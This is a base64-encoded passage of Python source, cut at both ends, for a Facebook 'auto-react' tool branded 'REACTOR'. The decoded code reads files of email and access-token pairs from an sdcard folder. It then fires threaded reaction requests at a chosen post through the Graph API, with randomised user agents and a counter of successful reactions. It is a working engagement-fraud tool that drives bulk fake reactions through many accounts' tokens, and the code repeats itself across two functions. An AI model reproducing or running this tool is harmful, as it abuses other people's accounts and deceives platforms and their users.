ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIiAgICAge3JlZH1bUkVBQ1RPUl0ge3llbGxvd317dWlkfSAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSAPiB7cmVkfUZBSUxFRCBUTyBSRUFDVCEiKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgICAgICBwcmludChmIkVycm9yIHByb2Nlc3NpbmcgdG9rZW4ge3Rva2VufToge2V9IikKICAgICAgICAKICAgICAgICB0b2tlbnNfdXNlZCArPSBsZW4odG9rZW5zX2JhdGNoKSAgIyBVcGRhdGUgdGhlIHRvdGFsIHRva2VucyB1c2VkCiAgICAgICAgCiAgICAgICAgIyBCcmVhayBpZiB3ZSBydW4gb3V0IG9mIHRva2VucwogICAgICAgIGlmIHRva2Vuc191c2VkID49IGF2YWlsYWJsZV90b2tlbnM6CiAgICAgICAgICAgIHByaW50KCJObyBtb3JlIHRva2VucyBhdmFpbGFibGUuIikKICAgICAgICAgICAgYnJlYWsKCiAgICBwcmludChmIntibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgcHJpbnQoZiJ7Z3JlZW59VE9UQUwgU1VDQ0VTU0ZVTCBSRUFDVElPTlM6IHt0b3RhbF9zdWNjZXNzZnVsX3JlYWN0aW9uc30iKQppbXBvcnQgcmVxdWVzdHMKZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciwgYXNfY29tcGxldGVkCgpkZWYgcGVyZm9ybV9yZWFjdGlvbih0b2tlbiwgdWlkX3VybCwgcmVhY3Rpb25fdHlwZSk6CiAgICAiIiJTZW5kIGEgcmVhY3Rpb24gdXNpbmcgdGhlIHByb3ZpZGVkIGFjY2VzcyB0b2tlbi4iIiIKICAgIGFjY2Vzc190b2tlbiA9IHRva2VuLnNwbGl0KCd8JylbMV0gICMgQXNzdW1pbmcgZm9ybWF0IGlzIGVtYWlsfGFjY2Vzc190b2tlbgogICAgYXV0b19yZWFjdCA9IGYnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20ve3VpZF91cmx9L3JlYWN0aW9ucz90eXBlPXtyZWFjdGlvbl90eXBlfSZhY2Nlc3NfdG9rZW49e2FjY2Vzc190b2tlbn0nCiAgICBoZWFkZXJzXyA9IHsKICAgICAgICAnVXNlci1BZ2VudCc6IFdfdWVyYWdudCgpICAjIFVzZSB0aGUgcmFuZG9tbHkgc2VsZWN0ZWQgdXNlciBhZ2VudAogICAgfQogICAgCiAgICB0cnk6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KGF1dG9fcmVhY3QsIGhlYWRlcnM9aGVhZGVyc18pCiAgICAgICAgcmV0dXJuIGFjY2Vzc190b2tlbiwgcmVzcG9uc2Uuc3RhdHVzX2NvZGUsIHJlc3BvbnNlLnRleHQgICMgUmV0dXJuIHRoZSByZXN1bHRzIGZvciBmdXJ0aGVyIHByb2Nlc3NpbmcKICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLlJlcXVlc3RFeGNlcHRpb24gYXMgZToKICAgICAgICByZXR1cm4gYWNjZXNzX3Rva2VuLCBOb25lLCBzdHIoZSkgICMgSGFuZGxlIHJlcXVlc3QgZXhjZXB0aW9ucwpkZWYgbGl2ZV9yZWFjdCgpOgogICAgIiIiUGVyZm9ybSByZWFjdGlvbnMgYmFzZWQgb24gdXNlciBpbnB1dCBmb3IgZmlsZSBjaG9pY2UsIHN0YXJ0aW5nIGxpbmUsIHBvc3QgbGluaywgcmVhY3Rpb24gdHlwZSwgYW5kIG51bWJlciBvZiByZWFjdGlvbnMuIiIiCiAgICAgICAKICAgICMgU3RlcCAxOiBBc2sgdGhlIHVzZXIgd2hpY2ggZmlsZSB0byB1c2UKICAgIGZpbGVfb3B0aW9ucyA9IHsKICAgICAgICAxOiAiL3NkY2FyZC9ib29zdHBoZXJlL0ZSQUFDQ09VTlQudHh0IiwKICAgICAgICAyOiAiL3NkY2FyZC9ib29zdHBoZXJlL0ZSQVBBR0VTLnR4dCIsCiAgICAgICAgMzogIi9zZGNhcmQvYm9vc3RwaGVyZS9SUFdBQ0NPVU5ULnR4dCIsCiAgICAgICAgNDogIi9zZGNhcmQvYm9vc3RwaGVyZS9SUFdQQUdFUy50eHQiCiAgICB9CiAgICBjbGVhcl9zY3JlZW4oKQogICAgam92YW4oKQogICAgcHJpbnQoZiIiIiAgICAge3doaXRlfUNIT09TRSBUWVBFIE9GIFJFQUNUT1JTOiAKICAgICB7Ymx1ZX1bMV0ge2dyZWVufUZSQSBBQ0NPVU5UIAogICAgIHtibHVlfVsyXSB7Z3JlZW59RlJBIFBBR0VTCiAgICAge2JsdWV9WzNdIHtncmVlbn1SUFcgQUNDT1VOVAogICAgIHtibHVlfVs0XSB7Z3JlZW59UlBXIFBBR0VTCiAgICAge3JlZH1bMF0gIHtyZWR9IEVYSVQgCiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIiIiKSAgIyBEaXNwbGF5IG9ubHkgdGhlIGZpbGVuYW1lCiAgICAKICAgIHRyeToKICAgICAgICBmaWxlX2Nob2ljZSA9IGludChpbnB1dChmIiAgICB7Z3JlZW59Q2hvb3NlOiAgIikpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgaWYgZmlsZV9jaG9pY2Ugbm90IGluIGZpbGVfb3B0aW9uczoKICAgICAgICAgICAgcHJpbnQoIkludmFsaWQgY2hvaWNlLiIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGZpbGVfcGF0aCA9IGZpbGVfb3B0aW9uc1tmaWxlX2Nob2ljZV0KICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIikKICAgICAgICByZXR1cm4KCiAgICAjIFN0ZXAgMjogTG9hZCB0aGUgdG9rZW5zIGZyb20gdGhlIHNlbGVjdGVkIGZpbGUKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgIHRva2VucyA9IFtsaW5lLnN0cmlwKCkgZm9yIGxpbmUgaW4gZmlsZS5yZWFkbGluZXMoKSBpZiBsaW5lLnN0cmlwKCldICAjIEVuc3VyZSBubyBlbXB0eSBsaW5lcwogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgIHByaW50KCJGaWxlIG5vdCBmb3VuZC4iKQogICAgICAgIHJldHVybgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiRXJyb3IgbG9hZGluZyB0b2tlbnM6IHtlfSIpCiAgICAgICAgcmV0dXJuCgogICAgYXZhaWxhYmxlX3Rva2VucyA9IGxlbih0b2tlbnMpCgogICAgIyBTdGVwIDM6IEFzayB0aGUgdXNlciBmb3IgdGhlIHN0YXJ0aW5nIGxpbmUKICAgIGlmIGF2YWlsYWJsZV90b2tlbnMgPT0gMDoKICAgICAgICBwcmludCgiTm8gdG9rZW5zIGF2YWlsYWJsZSBmcm9tIHRoZSBzZWxlY3RlZCBmaWxlLiIpCiAgICAgICAgcmV0dXJuCgogICAgdHJ5OgogICAgICAgIHN0YXJ0X2xpbmUgPSBpbnQoaW5wdXQoZiIgICAge2dyZWVufUVudGVyIHRoZSBzdGFydGluZyBsaW5lIHtyZWR9KDEgdG8ge2F2YWlsYWJsZV90b2tlbnN9e3JlZH0pOiAiKSkKICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBpZiBzdGFydF9saW5lIDwgMSBvciBzdGFydF9saW5lID4gYXZhaWxhYmxlX3Rva2VuczoKICAgICAgICAgICAgcHJpbnQoZiJQbGVhc2UgZW50ZXIgYSB2YWxpZCBsaW5lIG51bWJlciBiZXR3ZWVuIDEgYW5kIHthdmFpbGFibGVfdG9rZW5zfS4iKQogICAgICAgICAgICByZXR1cm4KICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIikKICAgICAgICByZXR1cm4KCiAgICB0b2tlbnMgPSB0b2tlbnNbc3RhcnRfbGluZSAtIDE6XSAgIyBVc2UgdG9rZW5zIHN0YXJ0aW5nIGZyb20gdGhlIHNlbGVjdGVkIGxpbmUKICAgIAogICAgcHJpbnQoZiIgICAge2dyZWVufUZPUk1BVCB7eWVsbG93fToge3JlZH1odHRwczovL3d3dy5mYWNlYm9vay5jb20vMTAwMDc4MDQzMjIyMjYwL3ZpZGVvLzExMDEwNTY4ODI2NzUzOC8iKQogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICB6ID0gaW5wdXQoZiIgICB7Z3JlZW59RW50ZXIgdGhlIHBvc3QgbGluayBvciBJRDogIikKICAgIHBvc3RfaWQgPSBnZXRfY29tYmluZWRfZGF0YSh6KQogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICB1aWRfdXJsID0gcG9zdF9pZCAgCgogICAgcHJpbnQoZiIiIiAgICB7eWVsbG93fUNob29zZSB0aGUgcmVhY3Rpb24gdHlwZToKICAgICB7Ymx1ZX1bMV0ge2dyZWVufUxJS0UKICAgICB7Ymx1ZX1bMl0ge2dyZWVufUxPVkUKICAgICB7Ymx1ZX1bM10ge2dyZWVufVdPVwogICAgIHtibHVlfVs0XSB7Z3JlZW59U0FECiAgICAge2JsdWV9WzVdIHtncmVlbn1BTkdSWQogICAgIHtibHVlfVs2XSB7Z3JlZW59SEFIQQogICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIiIikKICAgIAogICAgdHJ5OgogICAgICAgIHJlYWN0aW9uX2Nob2ljZSA9IGludChpbnB1dChmIiAgICAge2dyZWVufUNob29zZTogIikpCiAgICAgICAgcmVhY3Rpb25fbWFwID0gewogICAgICAgICAgICAxOiAiTElLRSIsCiAgICAgICAgICAgIDI6ICJMT1ZFIiwKICAgICAgICAgICAgMzogIldPVyIsCiAgICAgICAgICAgIDQ6ICJTQUQiLAogICAgICAgICAgICA1OiAiQU5HUlkiLAogICAgICAgICAgICA2OiAiSEFIQSIKICAgICAgICB9CiAgICAgICAgcmVhY3Rpb25fdHlwZSA9IHJlYWN0aW9uX21hcC5nZXQocmVhY3Rpb25fY2hvaWNlLCBOb25lKQogICAgICAgIGlmIHJlYWN0aW9uX3R5cGUgaXMgTm9uZToKICAgICAgICAgICAgcHJpbnQoIkludmFsaWQgcmVhY3Rpb24gY2hvaWNlLiIpCiAgICAgICAgICAgIHJldHVybgogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoIlBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlci4iKQogICAgICAgIHJldHVybgoKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgCiAgICB0cnk6CiAgICAgICAgbnVtX3JlYWN0aW9ucyA9IGludChpbnB1dChmIiAgICAge3llbGxvd31FbnRlciB0aGUgbnVtYmVyIG9mIHJlYWN0aW9uczogIikpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyIGZvciByZWFjdGlvbnMuIikKICAgICAgICByZXR1cm4KCiAgICBtYXhfd29ya2VycyA9IDEwICAjIFNldCBhIGxpbWl0IGZvciB0aGUgbnVtYmVyIG9mIGNvbmN1cnJlbnQgdGhyZWFkcwogICAgcmVhY3Rpb25zX2NvdW50ID0gMCAgIyBDb3VudGVyIGZvciBzdWNjZXNzZnVsIHJlYWN0aW9ucwogICAgdG90YWxfc3VjY2Vzc2Z1bF9yZWFjdGlvbnMgPSAwCiAgICByZXN1bHRzID0gW10gICMgU3RvcmUgcmVzdWx0cyBmb3IgZnVydGhlciBwcm9jZXNzaW5nCgogICAgdG9rZW5zX3VzZWQgPSAwICAjIFRyYWNrIHRoZSB0b3RhbCBudW1iZXIgb2YgdG9rZW5zIHVzZWQKICAgIAogICAgIyBLZWVwIHByb2Nlc3NpbmcgdG9rZW5zIHVudGlsIHdlIHJlYWNoIHRoZSBzdWNjZXNzZnVsIHJlYWN0aW9uIGxpbWl0CiAgICB3aGlsZSB0b3RhbF9zdWNjZXNzZnVsX3JlYWN0aW9ucyA8IG51bV9yZWFjdGlvbnMgYW5kIHRva2Vuc191c2VkIDwgYXZhaWxhYmxlX3Rva2VuczoKICAgICAgICByZW1haW5pbmdfdG9rZW5zID0gdG9rZW5zW3Rva2Vuc191c2VkOl0gICMgR2V0IHRoZSByZW1haW5pbmcgdG9rZW5zCiAgICAgICAgdG9rZW5zX2JhdGNoID0gcmVtYWluaW5nX3Rva2Vuc1s6bnVtX3JlYWN0aW9ucyAtIHRvdGFsX3N1Y2Nlc3NmdWxfcmVhY3Rpb25zXSAgIyBHZXQgb25seSB0aGUgbmVlZGVkIHRva2VucwogICAgICAgIAogICAgICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPW1heF93b3JrZXJzKSBhcyBleGVjdXRvcjoKICAgICAgICAgICAgZnV0dXJlX3RvX3Rva2VuID0ge2V4ZWN1dG9yLnN1Ym1pdChwZXJmb3JtX3JlYWN0aW9uLCB0b2tlbiwgdWlkX3VybCwgcmVhY3Rpb25fdHlwZSk6IHRva2VuIGZvciB0b2tlbiBpbiB0b2tlbnNfYmF0Y2h9CgogICAgICAgICAgICBmb3IgZnV0dXJlIGluIGFzX2NvbXBsZXRlZChmdXR1cmVfdG9fdG9rZW4pOgogICAgICAgICAgICAgICAgdG9rZW4gPSBmdXR1cmVfdG9fdG9rZW5bZnV0dXJlXQogICAgICAgICAgICAgICAgdWlkID0gdG9rZW4uc3BsaXQoJ3wnKVswXQogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIGFjY2Vzc190b2tlbiwgc3RhdHVzX2NvZGUsIHJlc3BvbnNlX3RleHQgPSBmdXR1cmUucmVzdWx0KCkKICAgICAgICAgICAgICAgICAgICBpZiBzdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICAgICAgICAgIHJlYWN0aW9uc19jb3VudCArPSAxCiAgICAgICAgICAgICAgICAgICAgICAgIHRvdGFsX3N1Y2Nlc3NmdWxfcmVhY3Rpb25zICs9IDEKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYiICAgICB7cmVkfVtSRUFDVE9SXSB7eWVsbG93fXt1aWR9ICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIA+IHtncmVlbn1TVUNDRVNTRlVMTFkgUkVBQ1RFRCEiKQogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgICAgICBwcmludChmIkVycm9yIHByb2Nlc3NpbmcgdG9rZW4ge3Rva2VufToge2V9IikKICAgICAgICAKICAgICAgICB0b2tlbnNfdXNlZCArPSBsZW4odG9rZW5zX2JhdGNoKSAgIyBVcGRhdGUgdGhlIHRvdGFsIHRva2VucyB1c2VkCiAgICAgICAgCiAgICAgICAgIyBCcmVhayBpZiB3ZSBydW4gb3V0IG9mIHRva2VucwogICAgICAgIGlmIHRva2Vuc191c2VkID49IGF2YWlsYWJsZV90b2tlbnM6CiAgICAgICAgICAgIHByaW50KCJObyBtb3JlIHRva2VucyBhdmFpbGFibGUuIikKICAgICAgICAgICAgYnJlYWsKCiAgICBwcmludChmIntibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgcHJpbnQoZiJ7Z3JlZW59VE9UQUwgU1VDQ0VTU0ZVTCBSRUFDVElPTlM6IHt0b3RhbF9zdWNjZXNzZnVsX3JlYWN0aW9uc30iKQpkZWYgdmlkKCk6CiAgICAiIiJQZXJmb3JtIHJlYWN0aW9ucyBiYXNlZCBvbiB1c2VyIGlucHV0IGZvciBmaWxlIGNob2ljZSwgc3RhcnRpbmcgbGluZSwgcG9zdCBsaW5rLCByZWFjdGlvbiB0eXBlLCBhbmQgbnVtYmVyIG9mIHJlYWN0aW9ucy4iIiIKICAgICAgIAogICAgIyBTdGVwIDE6IEFzayB0aGUgdXNlciB3aGljaCBmaWxlIHRvIHVzZQogICAgZmlsZV9vcHRpb25zID0gewogICAgICAgIDE6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvRlJBQUNDT1VOVC50eHQiLAogICAgICAgIDI6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvRlJBUEFHRVMudHh0IiwKICAgICAgICAzOiAiL3NkY2FyZC9ib29zdHBoZXJlL1JQV0FDQ09VTlQudHh0IiwKICAgICAgICA0OiAiL3NkY2FyZC9ib29zdHBoZXJlL1JQV1BBR0VTLnR4dCIKICAgIH0KICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICBwcmludChmIiIiICAgICB7d2hpdGV9Q0hPT1NFIFRZUEUgT0YgUkVBQ1RPUlM6IAogICAgIHtibHVlfVsxXSB7Z3JlZW59RlJBIEFDQ09VTlQgCiAgICAge2JsdWV9WzJdIHtncmVlbn1GUkEgUEFHRVMKICAgICB7Ymx1ZX1bM10ge2dyZWVufVJQVyBBQ0NPVU5UCiAgICAge2JsdWV9WzRdIHtncmVlbn1SUFcgUEFHRVMKICAgICB7cmVkfVswXSAge3JlZH0gRVhJVCAKICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iIiIpICAjIERpc3BsYXkgb25seSB0aGUgZmlsZW5hbWUKICAgIAogICAgdHJ5OgogICAgICAgIGZpbGVfY2hvaWNlID0gaW50KGlucHV0KGYiICAgIHtncmVlbn1DaG9vc2U6ICAiKSkKICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBpZiBmaWxlX2Nob2ljZSBub3QgaW4gZmlsZV9vcHRpb25zOgogICAgICAgICAgICBwcmludCgiSW52YWxpZCBjaG9pY2UuIikKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZmlsZV9wYXRoID0gZmlsZV9vcHRpb25zW2ZpbGVfY2hvaWNlXQogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoIlBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlci4iKQogICAgICAgIHJldHVybgoKICAgICMgU3RlcCAyOiBMb2FkIHRoZSB0b2tlbnMgZnJvbSB0aGUgc2VsZWN0ZWQgZmlsZQogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyJykgYXMgZmlsZToKICAgICAgICAgICAgdG9rZW5zID0gW2xpbmUuc3RyaXAoKSBmb3IgbGluZSBpbiBmaWxlLnJlYWRsaW5lcygpIGlmIGxpbmUuc3RyaXAoKV0gICMgRW5zdXJlIG5vIGVtcHR5IGxpbmVzCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgcHJpbnQoIkZpbGUgbm90IGZvdW5kLiIpCiAgICAgICAgcmV0dXJuCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJFcnJvciBsb2FkaW5nIHRva2Vuczoge2V9IikKICAgICAgICByZXR1cm4KCiAgICBhdmFpbGFibGVfdG9rZW5zID0gbGVuKHRva2VucykKCiAgICAjIFN0ZXAgMzogQXNrIHRoZSB1c2VyIGZvciB0aGUgc3RhcnRpbmcgbGluZQogICAgaWYgYXZhaWxhYmxlX3Rva2VucyA9PSAwOgogICAgICAgIHByaW50KCJObyB0b2tlbnMgYXZhaWxhYmxlIGZyb20gdGhlIHNlbGVjdGVkIGZpbGUuIikKICAgICAgICByZXR1cm4KCiAgICB0cnk6CiAgICAgICAgc3RhcnRfbGluZSA9IGludChpbnB1dChmIiAgICB7Z3JlZW59RW50ZXIgdGhlIHN0YXJ0aW5nIGxpbmUge3JlZH0oMSB0byB7YXZhaWxhYmxlX3Rva2Vuc317cmVkfSk6ICIpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGlmIHN0YXJ0X2xpbmUgPCAxIG9yIHN0YXJ0X2xpbmUgPiBhdmFpbGFibGVfdG9rZW5zOgogICAgICAgICAgICBwcmludChmIlBsZWFzZSBlbnRlciBhIHZhbGlkIGxpbmUgbnVtYmVyIGJldHdlZW4gMSBhbmQge2F2YWlsYWJsZV90b2tlbnN9LiIpCiAgICAgICAgICAgIHJldHVybgogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoIlBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlci4iKQogICAgICAgIHJldHVybgoKICAgIHRva2VucyA9IHRva2Vuc1tzdGFydF9saW5lIC0gMTpdICAjIFVzZSB0b2tlbnMgc3RhcnRpbmcgZnJvbSB0aGUgc2VsZWN0ZWQgbGluZQogICAgCiAgICBwcmludChmIiAgICB7Z3JlZW59Rk9STUFUIHt5ZWxsb3d9OiB7cmVkfWh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8xMDAwNzgwNDMyMjIyNjAvdmlkZW8vMTEwMTA1Njg4MjY3NTM4Lz9taWJleHRpZD1yUzQwYUI3UzlVY2J4dzZ2IikKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgeiA9IGlucHV0KGYiICAge2dyZWVufUVudGVyIHRoZSBwb3N0IGxpbmsgb3IgSUQ6ICIpCiAgICBwb3N0X2lkID0gZ2V0X2NvbWJpbmVkX2RhdGEoeikKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgO